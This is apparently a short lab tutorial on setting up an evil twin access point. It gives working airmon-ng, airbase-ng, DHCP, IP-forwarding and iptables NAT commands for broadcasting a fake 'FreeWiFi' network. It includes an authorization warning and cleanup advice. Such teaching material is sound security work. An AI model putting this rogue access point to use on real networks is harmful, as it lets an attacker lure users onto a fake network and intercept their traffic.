Lab Walkthrough
Build a Controlled Evil Twin (Terminal)
Commands and intent for a safe lab demo. Do not run on unauthorized networks.
Create the fake AP
sudo airmon-ng start wlan0
sudo airbase-ng -a 00:11:22:33:44:55 --essid "FreeWiFi" -c 6 wlan0mon

# airbase-ng creates interface at0 for clients
Configure DHCP and forwarding
# dhcpd.conf example
subnet 10.0.0.0 netmask 255.255.255.0 {
  range 10.0.0.10 10.0.0.100;
  option routers 10.0.0.1;
  option domain-name-servers 8.8.8.8, 8.8.4.4;
}

sudo ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
sudo systemctl start isc-dhcp-server
sudo sysctl -w net.ipv4.ip_forward=1
# Optional NAT for internet access
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
Concrete example
In a lab VM, use a dedicated wireless USB adapter in monitor mode and a second interface for internet. Connect a test phone to observe DHCP assignment and captive portal behavior.
Common mistake
Forgetting to start DHCP or to assign an IP to the virtual interface results in clients not receiving connectivity and the demo failing.
Key Takeaway
Always document lab scope, use test accounts, and fully clean up services and iptables rules after the demo.
